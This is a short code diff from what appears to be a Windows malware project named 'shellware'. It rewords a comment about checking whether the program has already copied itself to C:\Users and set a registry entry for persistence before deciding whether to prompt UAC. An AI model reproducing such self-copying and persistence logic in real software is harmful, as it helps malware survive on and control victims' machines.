@@ -108,8 +108,8 @@ def main():
 	execute()
 
 
-# Check to see if we're already copied to C:\Users, if so, we're going to assume
-# registry entry for persistence and copy to dir were succesful and not prompt UAC.
+# Check to see if we're already copied to C:\Users, if so, we know copy operation was succesful
+# and will assume registry entry for persistence was set and not prompt UAC.
 if os.path.isfile("C:\Users\shellware.exe"):
 	pass
 else:
